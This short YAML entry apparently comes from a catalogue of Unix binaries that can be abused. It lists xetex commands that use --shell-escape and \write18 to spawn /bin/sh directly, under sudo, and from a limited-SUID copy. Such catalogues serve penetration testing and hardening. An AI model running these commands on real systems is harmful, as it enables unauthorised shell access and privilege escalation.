---
functions:
  shell:
    - code: |
        xetex --shell-escape '\write18{/bin/sh}\end'
  sudo:
    - code: |
        sudo xetex --shell-escape '\write18{/bin/sh}\end'
  limited-suid:
    - code: |
        ./xetex --shell-escape '\write18{/bin/sh}\end'
---
